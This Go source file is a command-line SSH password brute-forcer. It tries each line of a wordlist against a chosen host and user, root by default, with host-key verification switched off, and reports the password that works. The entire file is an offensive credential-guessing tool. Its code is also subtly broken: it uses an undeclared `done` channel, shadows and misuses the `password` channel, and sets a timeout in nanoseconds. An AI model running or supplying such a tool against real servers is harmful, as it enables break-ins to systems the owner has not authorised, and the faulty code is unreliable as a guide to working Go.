/*
golang program to find a password for a ssh user using a large wordlist file.
TODO: add args to check if the ip is down and create a results file.
*/

package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

var (
	wordlist = flag.String("file", "wordlist.txt", "indicate wordlist file to use")
	ip       = flag.String("ip", "127.0.0.1",
		"indicate the ip address to attack")

	port = flag.Int("port", 22, "indicate port to attack force")
	user = flag.String("user", "root", "indicate user to use")
	// Set the timeout depending on the latency between you and the remote host.
	timeoutInt = flag.Int("timeout", 300,
		"set timeout to ssh dial response, don't set this too low")

	starttime = time.Now()
	password  = make(chan string)
	timeout   time.Duration
)

func main() {
	flag.Parse()
	printUsedValues()
	timeout = time.Duration(*timeoutInt)

	passFile, err := os.Open(*wordlist)
	if err != nil {
		fmt.Printf("Error opening wordlist: %v\n", err)
		return
	}
	defer passFile.Close()

	scanner := bufio.NewScanner(passFile)
	for scanner.Scan() {
		password := scanner.Text()
		go func(pass string) {
			err := sshdialer(pass)
			if err == nil {
				done <- struct{}{}
			}
		}(password)

		time.Sleep(timeout)
	}

	correct := <-password
	if correct == "" {
		return
	}

	// Yay it worked! show the password found
	end := time.Now()
	d := end.Sub(starttime)
	duration := d.Seconds()
	fmt.Fprintf(color.Output, "\n%s",
		color.YellowString("###########################"))
	fmt.Fprintf(color.Output, "%s %s",
		color.BlueString("\nPassword found: "), color.GreenString(password))

	fmt.Fprintf(color.Output, "\n%s", color.YellowString("###########################"))
	fmt.Printf("\nCompleted in %v seconds\n",
		strconv.FormatFloat(duration, 'g', -1, 64))
}

func sshdialer(password string) error {
	config := &ssh.ClientConfig{
		User:            *user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         timeout,
	}

	// Create dial
	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
	if err != nil {
		fmt.Fprintf(color.Output,
			color.RedString("%s", password))

		fmt.Fprintf(color.Output,
			color.WhiteString(" // Failed\n"))
		return err
	}

	return nil
}

func printUsedValues() {
	fmt.Printf("target: %s@%s:%d\n", *user, *ip, *port)
	fmt.Printf("timeout: %d\n", timeout)
	fmt.Printf("wordlist: %s\n", *wordlist)
}
